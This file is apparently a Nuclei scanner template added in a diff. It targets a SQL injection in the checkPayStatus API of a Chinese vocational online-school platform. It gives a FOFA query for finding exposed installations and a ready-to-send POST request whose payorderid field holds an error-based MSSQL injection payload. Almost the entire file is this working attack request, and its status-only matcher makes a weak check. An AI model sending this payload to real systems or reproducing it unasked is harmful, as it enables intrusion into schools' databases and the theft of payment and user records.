@@ -1,0 +1,36 @@
+id: poc-3860971819
+info:
+  name: 科汛新职教网校系统 checkPayStatus 存在SQL注入漏洞_ud7p7nmfxqdey1o7
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: (body="/KS_Inc/static/edu") || (body="/tp/PC/skin05" && body="class-type fl type-poster")
+http:
+- raw:
+  - 'POST /Webapi/Common/checkPayStatus HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Content-Type: application/json
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+
+    {"payorderid":"1'' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
